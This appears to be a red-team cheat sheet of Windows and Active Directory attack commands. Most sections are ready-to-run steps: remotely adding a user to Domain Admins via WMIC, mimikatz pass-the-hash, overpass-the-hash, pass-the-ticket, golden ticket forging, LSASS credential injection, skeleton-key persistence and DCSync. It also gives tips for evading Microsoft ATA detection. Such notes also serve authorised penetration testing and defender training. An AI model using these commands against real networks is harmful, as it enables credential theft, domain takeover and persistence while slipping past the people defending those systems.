Windows: How to See Currently Logged in Users in Windows 10 / 8 / 7
----------------------------------------------------------------

From cmd.exe:

```
C:\>query user
  USERNAME                SESSIONNAME     ID  STATE   IDLE TIME   LOGON TIME
 >tom                     console          8  Active          .   3/11/2017 12:24 AM
  test                                    11  Disc            .   3/11/2017 12:30 AM
```


Windows: Add domain user and add to domain group
---------------------------------------------------------

```
C:\>net user <username> <password> /add /domain
The command completed successfully.

C:\>net group <groupname> <username> /add /domain
The command completed successfully.
```


Windows: Add local user and add to local group
---------------------------------------------------------

```
C:\>net user <username> <password> /add
The command completed successfully.

C:\>net localgroup <groupname> <username> /add
The command completed successfully.
```


Windows: WMI commands
---------------------------------------

WMIC has a tricky syntax. The below commands and [this link](https://isc.sans.edu/diary/The+Grammar+of+WMIC/2376) should get you started with the essentials. Take note of which key elements are in quotes, such as hostnames with hyphens and group names with whitespace.

Example: From host "I-WILL-WEF", used WMIC to create a domain user remotely on "IWILL-WIN2K16-1" and then to add that user to Domain Admins. (Note that the output from these commands was sketchy, so I had to verify they worked via `net group "Domain Admins"`.

```
C:\>wmic /node:"IWILL-WIN2K16-1" process call create "cmd.exe /c net user domainadmin ladmin123!@# /add /domain"

C:\>wmic /node:"IWILL-WIN2K16-1" process call create 'cmd.exe /c net group "domain admins" domainadmin /add /domain'
```



Microsoft AD Exploitation: Golden Tickets, Silver Tickets, and More.
----------------------------------------------------------------

From [https://adsecurity.org/?p=1515](https://adsecurity.org/?p=1515).

That article has all relevant info about the tickets, so I'm not reproducing it here. It also contains mitigation/countermeasures for Kerberos ticket exploitation, and that's helpful for building less-detectable forged tickets.



Microsoft AD: Microsoft ATA (Advanced Threat Analytics)
-----------------------------------------------------------

ATA Playbook: [https://gallery.technet.microsoft.com/Advanced-Threat-Analytics-8b0a86bc/file/169608/1/ATA%20Playbook.pdf](https://gallery.technet.microsoft.com/Advanced-Threat-Analytics-8b0a86bc/file/169608/1/ATA%20Playbook.pdf)

ATA can develop a baseline of normal user activity over a 21-day period in learning mode. Out of the box, it appears to be based around SMB Enumeration and Pivoting using Windows Domain credentials. Examples of non-domain enumberation that should be detected are:

* ```nmap -p 445 <IP>/<CIDR> --script smb-enum-shares```
* ```enum4linux <IP>```
* ```smbclient -I <IP> -U Anonymous -N```
* [PowerView, a PowerShell recon module found in PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon).

ATA also looks domain enumeration, particularly any `net` commands that query the DC:

* ```nslookup```
* ```ls -d <domain>```
* ```net user /domain```
* ```net group /domain```
* ```net group "domain admins" /domain```
* ```netsess.exe <domain controller>``` Requires NetSess.exe.
* BloohHound domain-mapping tool from [https://github.com/BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound).






Hash harvesting

Before an attacker can carry out a pass-the-hash attack, they must obtain the password hashes of the target user accounts. To this end, penetration testers and attackers can harvest password hashes using a number of different methods:

    Cached hashes or credentials of users who have previously logged onto a machine (for example at the console or via RDP) can be read from the SAM by anyone who has Administrator-level privileges. The default behavior of caching hashes or credentials for offline use can be disabled by administrators, so this technique may not always work if a machine has been sufficiently hardened.
    Dumping the local user's account database (SAM). This database only contains user accounts local to the particular machine that was compromised. For example, in a domain environment, the SAM database of a machine will not contain domain users, only users local to that machine that more likely will not be very useful to authenticate to other services on the domain. However, if the same local administrative account passwords are used across multiple systems the attacker can remotely access those systems using the local user account hashes.
    Sniffing LM and NTLM challenge-response dialogues between client and servers, and later brute-forcing captured encrypted hashes (since the hashes obtained in this way are encrypted, it is necessary to perform a brute-force attack to obtain the actual hashes).
    Dumping authenticated users' credentials stored by Windows in the memory of the lsass.exe process. The credentials dumped in this way may include those of domain users or administrators, such as those logged in via RDP. This technique may therefore be used to obtain credentials of user accounts that are not local to the compromised computer, but rather originate from the security domain that the machine is a member of.






Windows: Pass the Hash (PtH)
-----------------------
Utilizing the credentials discovered in the Credential Dumping phase, attempt an PTH attack against a remote system with a user’s NTLM hash that was cached (and dumped by you) on your foothold system. Use mimikatz to authenticate with the DC and get a token. You are now using a security token granted to that user. Essentially you convert a cached password hash into unfettered access to act as that user via granted token. **Note: PtH is often detected by threat countermeasures now. Look at OPtH.**

In this example, you already have those cached and hashed credentials (which also means you're running as SYSTEM). See info on hash harvesting for more on getting hashdumps.

```
mimikatz “privilege::debug” “sekurlsa::pth /user:<Victim> /ntlm:<NTLM> /domain:<DOMAIN>” “exit”

psexec \\<any-remote-pc-victim-user-can-access> -accepteula cmd /c "del c:\flag.txt"
```




Windows: OverPass the Hash (OPtH)
-----------------------
It's like PtH, except instead of involving a crypto-downgrade exploit (in which you convince the DC to allow less-secure NTLM hashes), OPtH sends the full AES keys as well. This is less likely to trigger countermeasures, including Microsoft ATA. The flow is similar to PtH. Note that it has been reported that you can use any 128-bit value for the AES128 key if you can't obtain the key.

In this example, you already have those cached and hashed credentials (which also means you're running as SYSTEM). See info on hash harvesting for more on getting hashdumps.

```
mimikatz “privilege::debug” “sekurlsa::ekeys" "exit"

mimikatz “privilege::debug” “sekurlsa::pth /user:<Victim> /domain:<DOMAIN> /ntlm:<ntlm_hash> /aes128:<aes128_key> /aes256:<aes256_key>” “exit”

psexec \\<remote-pc> -accepteula cmd /c "del c:\flag.txt"
```








Microsoft AD: Pass the Ticket (PtT)
----------------------
Using tickets discovered from a remote system (see: Pass the Hash), compromise another user via PtT attack. Import tickets copied from remote system in the PtH attack. Validate that tickets are successfully imported. Lastly, pull a directory listing from a remote DC using the ticket stolen from the remote system.

```
mimikatz "privilege::debug" "Kerberos::ptt c:\temp\tickets" "exit"

klist

dir \\<remote-domain-controller>\c$
```




Microsoft AD: Golden Ticket with AES Keys
-----------------------------------------------
Similar to the upgrade from PtH to OPtH, use the user's AES256 key to obtain a golden ticket.

```
mimikatz "privilege::debug" "sekurlsa::ekeys" "exit"

mimikatz "privilege::debug" "kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /aes256:<aes256_key> /groups:<groups> /startoffset:-1 /endin:2500 /renewmax:3000 /ptt"
```





Windows: PowerShell remoting via PsExec
----------------------------------------------

In this example, we merely create a new local user on the target and then add the user to a localgroup.

```
psexec \\<remote-DC> -accepteula net user <username> <password> /add
psexec \\<remote-DC> -accepteula net localgroup <groupname> <username> /Add
```


Windows: PSRemoting (PowerShell) inject credentials into remote system's LSASS
---------------------------------------------------------------------------

Use PowerSploit:

```
Invoke-Mimikatz -Command ' "privilege::debug" "LSADump::LSA /inject" ' -Computer dc.local
```


Windows: PSRemoting Command Execution
-----------------------------------------------

```
Invoke-Command -ComputerName <computer_name> -ScriptBlock { del c:\flag.txt }
```




Microsoft AD: Skeleton Key Persistence
---------------------------------------
This uses mimikatz on a remote DC to deploy skeleton master keys. From an unprivileged account, login as a domain administrator to the remote DC using that key (named "mimikatz" in this example).

```
xcopy mimikatz \\<remote-DC>\c$\temp\

psexec \\<remote-DC> -accepteula cmd /c (cd c:\temp ^& mimikatz "privilege::debug" "misc::skeleton" ^& "exit")

net use k:\\<remote-DC>c$ mimikatz /user:<admin-username>@<domain>
```



Microsoft AD: DCSync
--------------------
Basically, tell a DC that you're another DC and get a bunch of its juicy data.

```
mimikatz "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>
```



Microsoft AD: Bloodhound/Sharphound
------------------------------------------

Enumerate and view the AD environment. Use the `-ExcludeDC` switch (as in below example) to prevent triggering Microsoft ATA.

```
Invoke-Bloodhound -ExcludeDC
```





